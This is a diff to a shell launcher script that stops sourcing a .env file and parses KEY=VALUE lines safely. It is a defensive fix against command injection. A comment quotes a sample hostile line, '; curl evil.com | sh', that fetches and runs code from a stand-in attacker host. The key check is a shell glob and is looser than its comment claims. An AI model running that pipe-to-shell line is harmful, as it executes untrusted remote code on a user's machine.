@@ -7,9 +7,30 @@ if [ ! -f "$ENV_MEM0" ]; then
   exit 1
 fi
 
-set -a
-# shellcheck disable=SC1090
-. "$ENV_MEM0"
-set +a
+# Parse KEY=VALUE lines; ignore comments/blank; reject shell-injection payloads.
+# Only export lines whose key matches ^[A-Za-z_][A-Za-z0-9_]*$
+# This blocks curl|bash style attacks where a user pastes an .env block from
+# a tutorial that contains "; curl evil.com | sh" or similar.
+while IFS= read -r line || [ -n "$line" ]; do
+  # Strip leading whitespace
+  line="${line#"${line%%[![:space:]]*}"}"
+  # Skip blanks and shell comments
+  case "$line" in
+    ""|\#*) continue ;;
+  esac
+  # Require a separating `=` and a non-empty key
+  case "$line" in
+    *=*) ;;
+    *) continue ;;
+  esac
+  key="${line%%=*}"
+  val="${line#*=}"
+  # Key must look like a shell variable name
+  case "$key" in
+    [A-Za-z_][A-Za-z0-9_]*) ;;
+    *) continue ;;
+  esac
+  export "$key"="$val"
+done < "$ENV_MEM0"
 
 exec mem0-mcp-selfhosted "$@"
